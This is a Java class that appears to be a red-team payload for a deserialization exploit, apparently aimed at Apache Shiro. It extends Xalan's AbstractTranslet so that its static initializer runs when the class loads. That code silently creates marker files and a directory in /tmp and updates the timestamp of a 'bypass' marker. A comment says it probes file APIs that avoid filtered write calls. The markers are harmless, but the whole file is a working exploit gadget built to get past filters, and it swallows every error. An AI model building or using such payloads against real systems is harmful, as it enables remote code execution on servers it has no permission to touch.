import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/** RT轮探针：java.io.File 的非流式 API 面（不走 FileOutputStream/Files.write）：
 *   1) File.createNewFile  → /tmp/pwn_shiro_io
 *   2) File.mkdir          → /tmp/pwn_shiro_io_dir
 *   3) File.setLastModified→ 更新既有标记 pwn_shiro_nio_bypass 的 mtime
 *  三动作独立 try/catch，真值可分别归因。 */
public class PwnIo extends AbstractTranslet {
    static {
        try {
            java.io.File f = new java.io.File("/tmp/pwn_shiro_io");
            f.createNewFile();
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.io.File d = new java.io.File("/tmp/pwn_shiro_io_dir");
            d.mkdir();
        } catch (Throwable t) {
            // 静默
        }
        try {
            java.io.File m = new java.io.File("/tmp/pwn_shiro_nio_bypass");
            m.setLastModified(System.currentTimeMillis());
        } catch (Throwable t) {
            // 静默
        }
    }

    public PwnIo() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
